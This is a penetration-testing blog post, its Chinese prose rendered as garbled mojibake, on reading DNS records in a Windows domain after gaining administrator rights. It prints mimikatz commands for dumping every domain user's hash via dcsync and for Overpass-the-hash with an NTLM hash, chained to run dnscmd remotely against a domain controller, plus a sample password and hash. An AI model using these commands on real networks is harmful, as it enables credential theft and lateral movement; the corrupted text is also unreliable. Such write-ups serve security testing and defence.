I""<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨åŸŸæ¸—é€ä¸­ï¼Œå¯¹åŸŸç¯å¢ƒçš„ä¿¡æ¯æœé›†å¾ˆå…³é”®ï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†åŸŸå†…ç®¡ç†å‘˜çš„æƒé™ï¼Œé‚£ä¹ˆå¦‚ä½•èƒ½å¤Ÿå¿«é€Ÿäº†è§£åŸŸå†…çš„ç½‘ç»œæ¶æ„å‘¢ï¼ŸDNSè®°å½•æ— ç–‘æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒã€‚</p>

<p>æœ¬æ–‡å°†è¦ä»‹ç»åœ¨åŸŸæ¸—é€ä¸­ï¼Œè·å¾—DNSç®¡ç†å‘˜æƒé™åï¼Œè·å–DNSè®°å½•çš„æ–¹æ³•</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>é€šè¿‡DNS Managerè·å–DNSè®°å½•</li>
  <li>é€šè¿‡dnscmdè·å–DNSè®°å½•</li>
  <li>åŸŸå†…è¿œç¨‹è¯»å–DNSè®°å½•çš„æ–¹æ³•</li>
</ul>

<h2 id="0x02-é€šè¿‡dns-managerè·å–dnsè®°å½•">0x02 é€šè¿‡DNS Managerè·å–DNSè®°å½•</h2>
<hr />

<p>æµ‹è¯•ç³»ç»Ÿï¼š</p>

<p>Windows Server 2008 R2 x64</p>

<p>é€‰æ‹©<code class="language-plaintext highlighter-rouge">Administrative Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">DNS</code></p>

<p>åœ¨<code class="language-plaintext highlighter-rouge">Forward Lookup Zones</code>ä¸‹æ‰¾åˆ°å½“å‰åŸŸåï¼Œèƒ½å¤Ÿæ˜¾ç¤ºå½“å‰åŸŸå†…çš„DNSè®°å½•ï¼ŒåŒ…æ‹¬ä¸»æœºåå’Œå¯¹åº”çš„IP</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/2-1.png" alt="Alt text" /></p>

<h2 id="0x03-é€šè¿‡dnscmdè·å–dnsè®°å½•">0x03 é€šè¿‡dnscmdè·å–DNSè®°å½•</h2>
<hr />

<p>dnscmdï¼š</p>

<p>ç”¨æ¥ç®¡ç†DNSæœåŠ¡å™¨çš„å‘½ä»¤è¡Œæ¥å£ï¼Œæ”¯æŒè¿œç¨‹è¿æ¥</p>

<p>é»˜è®¤å®‰è£…çš„ç³»ç»Ÿï¼š</p>

<ul>
  <li>Windows Server 2003</li>
  <li>Windows Server 2008</li>
  <li>Windows Server 2003 R2</li>
  <li>Windows Server 2008 R2</li>
  <li>Windows Server 2012</li>
  <li>Windows Server 2003 with SP1</li>
  <li>â€¦</li>
</ul>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p>

<p>Win7ç³»ç»Ÿåœ¨ä½¿ç”¨æ—¶éœ€è¦å®‰è£…Remote Server Administration Tools (RSAT)</p>

<p>å‚è€ƒåœ°å€ï¼š</p>

<p>https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems</p>

<p>RSATä¸‹è½½åœ°å€ï¼š</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=7887</p>

<p>æµ‹è¯•ç³»ç»Ÿï¼š</p>

<p>Windows Server 2008 R2 x64</p>

<p>å¸¸ç”¨å‘½ä»¤:</p>

<h4 id="1åˆ—å‡ºdnsåŒºåŸŸä¸­å½“å‰èŠ‚ç‚¹çš„èµ„æºè®°å½•">(1)åˆ—å‡ºDNSåŒºåŸŸä¸­å½“å‰èŠ‚ç‚¹çš„èµ„æºè®°å½•ï¼š</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumZones
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-1.png" alt="Alt text" /></p>

<h4 id="2åˆ—å‡ºtestcomçš„ä¿¡æ¯">(2)åˆ—å‡ºtest.comçš„ä¿¡æ¯ï¼š</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZoneInfo test.com
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-2.png" alt="Alt text" /></p>

<h4 id="3åˆ—ä¸¾testcomä¸­çš„è®°å½•æ–¹æ³•1æ›´è¯¦ç»†">(3)åˆ—ä¸¾test.comä¸­çš„è®°å½•ï¼Œæ–¹æ³•1(æ›´è¯¦ç»†)ï¼š</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZonePrint test.com
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-3.png" alt="Alt text" /></p>

<h4 id="4åˆ—ä¸¾testccomçš„è®°å½•æ–¹æ³•2">(4)åˆ—ä¸¾testc.comçš„è®°å½•ï¼Œæ–¹æ³•2ï¼š</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumRecords test.com .
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-4.png" alt="Alt text" /></p>

<p>ç»“æœåŒDNS Managerè·å–çš„è®°å½•ä¸€è‡´</p>

<h2 id="0x04-åŸŸå†…è¿œç¨‹è¯»å–dnsè®°å½•çš„æ–¹æ³•">0x04 åŸŸå†…è¿œç¨‹è¯»å–DNSè®°å½•çš„æ–¹æ³•</h2>
<hr />

<h3 id="æ–¹æ³•åˆ†æ">æ–¹æ³•åˆ†æ</h3>

<p>å‰æéœ€è¦è·å¾—åŸŸç®¡ç†å‘˜çš„æƒé™</p>

<p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å…ˆè¿œç¨‹è¿æ¥åŸŸæ§åˆ¶å™¨ï¼Œç„¶ååœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œdnscmdè·å–DNSè®°å½•</p>

<p>ç¬¬äºŒç§æ–¹æ³•æ˜¯åœ¨åŸŸå†…ä¸€å°ä¸»æœºä¸Šé¢ï¼Œæ‰§è¡Œdnscmdè¿œç¨‹è¯»å–DNSè®°å½•</p>

<p>ä½†æ˜¯Win7ç³»ç»Ÿé»˜è®¤ä¸æ”¯æŒdnscmdï¼Œç›´æ¥å®‰è£…Remote Server Administration Tools (RSAT)ä¹Ÿä¸ç°å®</p>

<p>äºæ˜¯ï¼Œæˆ‘å°è¯•å¯»æ‰¾åœ¨æœªå®‰è£…Remote Server Administration Tools (RSAT)çš„ç³»ç»Ÿä¸Šæ‰§è¡Œdnscmdçš„æ–¹æ³•</p>

<h3 id="æ–¹æ³•æµ‹è¯•">æ–¹æ³•æµ‹è¯•</h3>

<p>å‘æœªå®‰è£…Remote Server Administration Tools (RSAT)çš„Win7ç³»ç»Ÿä¸Šå¤åˆ¶ä¸€ä¸ªdnscmd.exeï¼Œç›´æ¥æ‰§è¡Œï¼Œç»“æœå¤±è´¥</p>

<h3 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h3>

<p>é€šè¿‡Process Monitorè®°å½•dnscmdçš„æ‰§è¡Œè¿‡ç¨‹ï¼ŒæŸ¥çœ‹ç¼ºå°‘å“ªäº›æ–‡ä»¶</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-1.png" alt="Alt text" /></p>

<p>å‘ç°ç¼ºå°‘æ–‡ä»¶dnscmd.exe.mui</p>

<p>è¡¥å…¨ç¼ºå°‘çš„æ–‡ä»¶ï¼Œå†æ¬¡æµ‹è¯•ï¼Œæœ€ç»ˆæ‰¾åˆ°è§£å†³æ–¹æ³•</p>

<p>åœ¨æœªå®‰è£…Remote Server Administration Tools (RSAT)çš„ç³»ç»Ÿä¸Šæ‰§è¡Œdnscmdï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>

<ol>
  <li>dnscmdä¿å­˜åœ¨è·¯å¾„<code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>ä¸‹</li>
  <li>dnscmd.exe.muiä¿å­˜åœ¨<code class="language-plaintext highlighter-rouge">C:\Windows\System32\en-US</code>ä¸‹(è¯¥ä½ç½®æ¯”è¾ƒé€šç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨å…¶ä»–ä½ç½®)</li>
</ol>

<p><strong>æ³¨ï¼š</strong></p>

<p>dnscmdå’Œdnscmd.exe.muiä½¿ç”¨Windows Server 2008 R2ä¸‹çš„å³å¯</p>

<p>è¿™é‡Œæä¾›ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶(æˆ‘ä»Windows Server 2008 R2ä¸‹è·å¾—çš„)ï¼š</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»…ä¾›æµ‹è¯•</p>

<p>ç”±äºdnscmdåœ¨è¿œç¨‹è¿æ¥æ—¶ï¼Œæœªæä¾›è¾“å…¥ç”¨æˆ·åå’Œå£ä»¤çš„æ¥å£ï¼Œè¿™é‡Œéœ€è¦å€ŸåŠ©mimikatzçš„Overpass-the-hash</p>

<p>é¦–å…ˆéœ€è¦è·å¾—åŸŸç®¡ç†å‘˜ç”¨æˆ·çš„hashï¼Œè¿™é‡Œåªèƒ½ç”¨ntlm/rc4/aes128/aes256</p>

<p>å¦‚æœè·å¾—äº†åŸŸç®¡ç†å‘˜ç”¨æˆ·çš„æ˜æ–‡å£ä»¤ï¼Œå¯ä»¥å…ˆå°†æ˜æ–‡è½¬ä¸ºntlmï¼Œåœ¨çº¿åŠ å¯†çš„ç½‘ç«™ï¼š</p>

<p>https://md5decrypt.net/en/Ntlm/</p>

<p>è¡¥å……ï¼šä½¿ç”¨dcsyncè·å¾—åŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æ–¹æ³•</p>

<p>åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œmimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.local /all /csv exit"
</code></pre></div></div>

<h3 id="å®é™…æµ‹è¯•">å®é™…æµ‹è¯•</h3>

<p>æµ‹è¯•ç¯å¢ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p>

<ul>
  <li>åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼šAdministrator</li>
  <li>å£ä»¤ï¼šDomainAdmin456!</li>
  <li>hashï¼šA55E0720F0041193632A58E007624B40</li>
</ul>

<p>Overpass-the-hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
</code></pre></div></div>

<p>è¿™æ ·ä¼šå¼¹å‡ºä¸€ä¸ªcmd.exe</p>

<p>æ¥ç€ä½¿ç”¨dnscmdè¿œç¨‹è¿æ¥è¿›è¡ŒæŸ¥è¯¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM /EnumZones
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¿™é‡Œè¦ä½¿ç”¨FQDNæˆ–è€…è®¡ç®—æœºå</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-2.png" alt="Alt text" /></p>

<p>å¦‚æœæƒ³åœ¨å‘½ä»¤è¡Œä¸‹å®ç°æ•´ä¸ªæµç¨‹ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p>

<p>æ–°å»º<code class="language-plaintext highlighter-rouge">c:\test\1.bat</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones &gt; c:\test\out.txt
</code></pre></div></div>

<p>Overpass-the-hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>cmd.exeä¸‹<code class="language-plaintext highlighter-rouge">"</code>éœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦<code class="language-plaintext highlighter-rouge">\"</code></p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åœ¨åŸŸå†…ä½¿ç”¨Overpass-the-hashå®ç°dnscmdè¿œç¨‹è¯»å–DNSè®°å½•çš„æ–¹æ³•</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET